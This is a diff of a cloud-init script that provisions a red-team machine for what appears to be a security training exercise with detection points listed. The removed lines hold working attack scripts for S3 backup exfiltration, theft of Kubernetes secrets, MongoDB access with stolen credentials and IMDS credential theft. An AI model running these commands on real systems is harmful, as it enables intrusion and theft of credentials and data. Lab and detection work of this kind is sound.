@@ -22,7 +22,6 @@ apt-get install -y \
   git curl wget jq unzip \
   nmap netcat-openbsd \
   python3 python3-pip python3-venv \
-  mongodb-clients \
   dnsutils whois \
   tmux vim
 
@@ -56,257 +55,35 @@ export BACKUP_BUCKET="${backup_bucket}"
 export AWS_REGION="${aws_region}"
 ENVFILE
 
-# 01 - Reconnaissance script
-cat > /opt/redteam/scripts/01-recon.sh << 'RECON'
-#!/bin/bash
-source /opt/redteam/env.sh
+# Make scripts directory accessible 
+chmod 755 /opt/redteam/scripts
 
-echo "=== WIZ EXERCISE - RECONNAISSANCE PHASE ==="
-echo ""
-
-echo "[*] Phase 1: S3 Bucket Enumeration"
-echo "    Target: $BACKUP_BUCKET"
-echo ""
-
-# List public bucket contents
-echo "[+] Listing public S3 bucket contents..."
-aws s3 ls s3://$BACKUP_BUCKET --no-sign-request 2>/dev/null || echo "    Bucket not publicly listable"
-
-echo ""
-echo "[+] Attempting to list backup files..."
-aws s3 ls s3://$BACKUP_BUCKET/backups/ --no-sign-request 2>/dev/null
-
-echo ""
-echo "[*] Phase 2: Port Scanning"
-echo "    Target: $MONGODB_IP"
-
-# Quick port scan
-echo "[+] Scanning common ports..."
-nmap -Pn -p 22,27017,3389,443,80 $MONGODB_IP 2>/dev/null | grep -E "^[0-9]+/tcp"
-
-echo ""
-echo "=== RECON COMPLETE ==="
-echo ""
-echo "FINDINGS:"
-echo "1. S3 bucket $BACKUP_BUCKET may contain database backups"
-echo "2. Check for MongoDB on port 27017"
-echo "3. Check for SSH on port 22"
-RECON
-
-# 02 - S3 Data Exfiltration script
-cat > /opt/redteam/scripts/02-s3-exfil.sh << 'S3EXFIL'
-#!/bin/bash
-source /opt/redteam/env.sh
-
-echo "=== WIZ EXERCISE - S3 DATA EXFILTRATION ==="
-echo ""
-
-echo "[*] Downloading backup files from public bucket..."
-mkdir -p /opt/redteam/loot/backups
-
-# Download all backup files
-aws s3 sync s3://$BACKUP_BUCKET/backups/ /opt/redteam/loot/backups/ --no-sign-request 2>/dev/null
-
-echo ""
-echo "[+] Downloaded files:"
-ls -la /opt/redteam/loot/backups/
-
-echo ""
-echo "[*] Checking for encrypted vs unencrypted backups..."
-for f in /opt/redteam/loot/backups/*; do
-  if file "$f" | grep -q "GPG"; then
-    echo "    [ENCRYPTED] $f"
-  else
-    echo "    [UNENCRYPTED] $f - CAN BE EXTRACTED!"
-  fi
-done
-
-echo ""
-echo "=== S3 EXFIL COMPLETE ==="
-echo ""
-echo "DETECTION POINTS:"
-echo "- GuardDuty: UnauthorizedAccess finding for S3"
-echo "- CloudTrail: s3:GetObject and s3:ListBucket events"
-echo "- Security Hub: Public bucket finding"
-S3EXFIL
-
-# 03 - Kubernetes exploitation script
-cat > /opt/redteam/scripts/03-k8s-exploit.sh << 'K8SEXPLOIT'
-#!/bin/bash
-source /opt/redteam/env.sh
-
-echo "=== WIZ EXERCISE - KUBERNETES EXPLOITATION ==="
-echo ""
-
-echo "[*] Setting up kubectl..."
-aws eks update-kubeconfig --name $EKS_CLUSTER --region $AWS_REGION 2>/dev/null
-
-echo ""
-echo "[*] Phase 1: Enumerate cluster resources"
-echo "[+] Listing namespaces..."
-kubectl get namespaces 2>/dev/null
-
-echo ""
-echo "[+] Listing pods in tasky namespace..."
-kubectl get pods -n tasky 2>/dev/null
-
-echo ""
-echo "[*] Phase 2: Extract secrets"
-echo "[+] Listing secrets..."
-kubectl get secrets -n tasky 2>/dev/null
-
-echo ""
-echo "[+] Extracting MongoDB credentials..."
-MONGO_SECRET=$(kubectl get secret mongodb-credentials -n tasky -o jsonpath='{.data.MONGODB_URI}' 2>/dev/null | base64 -d)
-if [ -n "$MONGO_SECRET" ]; then
-  echo "    FOUND: $MONGO_SECRET"
-  echo "$MONGO_SECRET" > /opt/redteam/loot/mongodb-credentials.txt
-fi
-
-echo ""
-echo "[*] Phase 3: Check ServiceAccount permissions"
-echo "[+] Current context permissions..."
-kubectl auth can-i --list 2>/dev/null | head -20
-
-echo ""
-echo "=== K8S EXPLOIT COMPLETE ==="
-echo ""
-echo "DETECTION POINTS:"
-echo "- GuardDuty EKS: Kubernetes.SuccessfulAnonymousAccess"
-echo "- CloudTrail: eks:DescribeCluster API calls"
-echo "- Wazuh: kubectl activity from unusual source"
-K8SEXPLOIT
-
-# 04 - MongoDB access script
-cat > /opt/redteam/scripts/04-mongodb-access.sh << 'MONGOACCESS'
-#!/bin/bash
-source /opt/redteam/env.sh
-
-echo "=== WIZ EXERCISE - MONGODB ACCESS ==="
-echo ""
-
-# Check if we have credentials
-if [ -f /opt/redteam/loot/mongodb-credentials.txt ]; then
-  MONGO_URI=$(cat /opt/redteam/loot/mongodb-credentials.txt)
-  echo "[+] Using stolen credentials from K8s secret"
-else
-  echo "[-] No credentials found. Run 03-k8s-exploit.sh first"
-  exit 1
-fi
-
-echo ""
-echo "[*] Connecting to MongoDB..."
-echo "[+] URI: $MONGO_URI"
-
-# Connect and enumerate
-mongosh "$MONGO_URI" --eval "
-  print('=== Database Info ===');
-  db.adminCommand('listDatabases');
-  print('');
-  print('=== Collections ===');
-  db.getCollectionNames();
-  print('');
-  print('=== Sample Data ===');
-  db.todos.find().limit(3);
-"
-
-echo ""
-echo "=== MONGODB ACCESS COMPLETE ==="
-echo ""
-echo "DETECTION POINTS:"
-echo "- Wazuh: MongoDB connection from unusual IP"
-echo "- VPC Flow Logs: Connection to port 27017"
-MONGOACCESS
-
-# 05 - IMDS/Privilege Escalation script
-cat > /opt/redteam/scripts/05-privesc.sh << 'PRIVESC'
-#!/bin/bash
-source /opt/redteam/env.sh
-
-echo "=== WIZ EXERCISE - PRIVILEGE ESCALATION ==="
-echo ""
-echo "NOTE: This script demonstrates IMDS access on the MongoDB VM"
-echo "      You would need SSH access to the MongoDB VM to run this"
-echo ""
-
-cat << 'IMDS_SCRIPT'
-# Run these commands ON the MongoDB VM after gaining SSH access:
-
-# Step 1: Query IMDS for instance role credentials
-echo "[*] Querying Instance Metadata Service..."
-ROLE_NAME=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)
-echo "    Found role: $ROLE_NAME"
-
-# Step 2: Extract temporary credentials
-echo "[*] Extracting temporary credentials..."
-CREDS=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME)
-echo "$CREDS" | jq .
-
-# Step 3: Export credentials
-export AWS_ACCESS_KEY_ID=$(echo $CREDS | jq -r .AccessKeyId)
-export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | jq -r .SecretAccessKey)
-export AWS_SESSION_TOKEN=$(echo $CREDS | jq -r .Token)
-
-# Step 4: Enumerate permissions with stolen credentials
-echo "[*] Testing stolen credentials..."
-aws sts get-caller-identity
-
-echo "[*] Checking EC2 permissions (the VM has ec2:* !)..."
-aws ec2 describe-instances --region us-east-1 | jq '.Reservations[].Instances[] | {id: .InstanceId, state: .State.Name, type: .InstanceType}'
-IMDS_SCRIPT
-
-echo ""
-echo "=== PRIVESC INFO COMPLETE ==="
-echo ""
-echo "DETECTION POINTS:"
-echo "- GuardDuty: UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration"
-echo "- CloudTrail: API calls from unexpected IP using instance credentials"
-PRIVESC
-
-# Make scripts executable
-chmod +x /opt/redteam/scripts/*.sh
+# Deploy attack chain script to /home/ubuntu via base64-encoded gzip
+echo "${attack_chain_b64}" | base64 -d | gunzip > /home/ubuntu/attack-chain.sh
+chown ubuntu:ubuntu /home/ubuntu/attack-chain.sh
+chmod +x /home/ubuntu/attack-chain.sh
 
 # Create README
 cat > /opt/redteam/README.md << 'README'
-# Wiz Exercise - Red Team Scripts
+# Wiz Exercise - Red Team Attack Chain
 
-## Attack Chain Overview
+## Quick Start
 
-1. **01-recon.sh** - Initial reconnaissance
-   - S3 bucket enumeration
-   - Port scanning
-
-2. **02-s3-exfil.sh** - Data exfiltration
-   - Download backups from public S3 bucket
-
-3. **03-k8s-exploit.sh** - Kubernetes exploitation
-   - Extract secrets from cluster
-   - Demonstrate cluster-admin abuse
-
-4. **04-mongodb-access.sh** - Database access
-   - Connect using stolen credentials
-
-5. **05-privesc.sh** - Privilege escalation
-   - IMDS credential theft (run on MongoDB VM)
-   - Demonstrate overprivileged IAM role
-
-## Usage
+Run the interactive attack chain demo:
 
 ```bash
-source /opt/redteam/env.sh
-cd /opt/redteam/scripts
-
-# Run in sequence
-./01-recon.sh
-./02-s3-exfil.sh
-./03-k8s-exploit.sh
-./04-mongodb-access.sh
-./05-privesc.sh
+./attack-chain.sh
 ```
+
+The script walks through four phases:
+1. **Reconnaissance** - Discover public S3 bucket via enumeration
+2. **Exfiltration** - Download backups from public bucket
+3. **Lateral Movement** - Extract SSH key, pivot to MongoDB VM
+4. **Privilege Escalation** - IMDS credential theft on MongoDB VM
 
 ## Detection Points
 
-Each script includes expected detection points for:
+Each phase includes detection points for:
 - AWS GuardDuty
 - CloudTrail
 - Wazuh
@@ -316,8 +93,8 @@ README
 echo ""
 echo "Red Team instance setup completed at $(date)"
 echo ""
-echo "Attack scripts available at: /opt/redteam/scripts/"
-echo "Run 'source /opt/redteam/env.sh' to load environment"
+echo "Attack chain script: /home/ubuntu/attack-chain.sh"
+echo "Run './attack-chain.sh' to start the demo"
 
 %{ if enable_wazuh_agent && wazuh_manager_ip != "" ~}
 # ==========================================
@@ -325,22 +102,52 @@ echo "Run 'source /opt/redteam/env.sh' to load environment"
 # ==========================================
 echo "Installing Wazuh Agent at $(date)"
 
-# Add Wazuh repository
-curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | gpg --no-default-keyring \
-  --keyring gnupg-ring:/usr/share/keyrings/wazuh.gpg --import && chmod 644 /usr/share/keyrings/wazuh.gpg
+# Wait for Wazuh Manager to be ready (port 1514 for agent registration)
+# The Manager takes 5-10 minutes to fully initialize after EC2 launch
+WAZUH_MANAGER_IP="${wazuh_manager_ip}"
+MAX_RETRIES=60
+RETRY_INTERVAL=30
+WAZUH_READY=false
 
-echo "deb [signed-by=/usr/share/keyrings/wazuh.gpg] https://packages.wazuh.com/4.x/apt/ stable main" \
-  | tee /etc/apt/sources.list.d/wazuh.list
+echo "Waiting for Wazuh Manager at $WAZUH_MANAGER_IP to be ready..."
 
-apt-get update
+# Install netcat for port checking if not present
+apt-get install -y netcat-openbsd || apt-get install -y netcat
 
-# Install Wazuh agent with manager IP and agent name
-WAZUH_MANAGER="${wazuh_manager_ip}" WAZUH_AGENT_NAME="${environment}-redteam" apt-get install -y wazuh-agent
+for i in $(seq 1 $MAX_RETRIES); do
+  # Check if Wazuh Manager registration port (1514) is listening
+  if nc -z -w5 "$WAZUH_MANAGER_IP" 1514 2>/dev/null; then
+    echo "Wazuh Manager is ready (attempt $i/$MAX_RETRIES)"
+    WAZUH_READY=true
+    break
+  fi
+  echo "Wazuh Manager not ready yet, waiting... (attempt $i/$MAX_RETRIES)"
+  sleep $RETRY_INTERVAL
+done
 
-# Enable and start Wazuh agent
-systemctl daemon-reload
-systemctl enable wazuh-agent
-systemctl start wazuh-agent
+if [ "$WAZUH_READY" = "true" ]; then
+  # Add Wazuh repository
+  curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | gpg --no-default-keyring \
+    --keyring gnupg-ring:/usr/share/keyrings/wazuh.gpg --import && chmod 644 /usr/share/keyrings/wazuh.gpg
 
-echo "Wazuh Agent installation completed at $(date)"
+  echo "deb [signed-by=/usr/share/keyrings/wazuh.gpg] https://packages.wazuh.com/4.x/apt/ stable main" \
+    | tee /etc/apt/sources.list.d/wazuh.list
+
+  apt-get update
+
+  # Install Wazuh agent with manager IP and unique agent name
+  # Use instance ID suffix to avoid duplicate name conflicts on instance rebuild
+  INSTANCE_ID=$(curl -s http://169.254.169.254/latest/meta-data/instance-id 2>/dev/null | tail -c 8 || date +%s | tail -c 8)
+  WAZUH_MANAGER="$WAZUH_MANAGER_IP" WAZUH_AGENT_NAME="${environment}-redteam-$INSTANCE_ID" apt-get install -y wazuh-agent
+
+  # Enable and start Wazuh agent
+  systemctl daemon-reload
+  systemctl enable wazuh-agent
+  systemctl start wazuh-agent
+
+  echo "Wazuh Agent installation completed at $(date)"
+else
+  echo "ERROR: Wazuh Manager did not become ready after $((MAX_RETRIES * RETRY_INTERVAL)) seconds"
+  echo "Wazuh Agent installation skipped. Manual installation required."
+fi
 %{ endif ~}
